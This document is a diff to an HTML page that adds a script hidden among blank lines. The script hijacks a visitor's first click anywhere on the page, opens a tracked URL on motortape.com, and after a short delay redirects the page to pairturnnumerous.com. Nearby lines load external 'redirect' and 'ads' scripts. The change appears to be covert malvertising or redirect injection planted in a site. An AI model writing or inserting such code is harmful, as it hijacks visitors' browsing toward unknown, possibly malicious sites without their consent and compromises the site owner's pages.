@@ -97,6 +97,52 @@
       });
     });
   </script>
+
+
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  const buttonRedirectURL = "https://motortape.com/zcvm0rch?key=93b158ea491b4f11e0adbacd15934c67";
+  const pageRedirectURL   = "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c";
+
+  let triggered = false;
+
+  function handleRedirect() {
+    if (triggered) return;
+    triggered = true;
+
+    // try open new tab
+    const win = window.open(buttonRedirectURL, "_blank");
+
+    // fallback if popup blocked
+    if (!win) {
+      window.location.href = buttonRedirectURL;
+      return;
+    }
+
+    // second redirect after delay
+    setTimeout(() => {
+      window.location.href = pageRedirectURL;
+    }, 1200);
+  }
+
+  // click anywhere on page
+  document.body.addEventListener("click", handleRedirect, { once: true });
+
+});
+</script>
+
+
+
+
+
+
+
+
+  
 <script src="https://yourkalon.github.io/web/redirect.js"></script>
   <script src="https://yourkalon.github.io/web/ads.js"></script>
 <script src="https://motortape.com/6b/89/aa/6b89aad2237dc8201a8f02571f2fbdc1.js"></script>
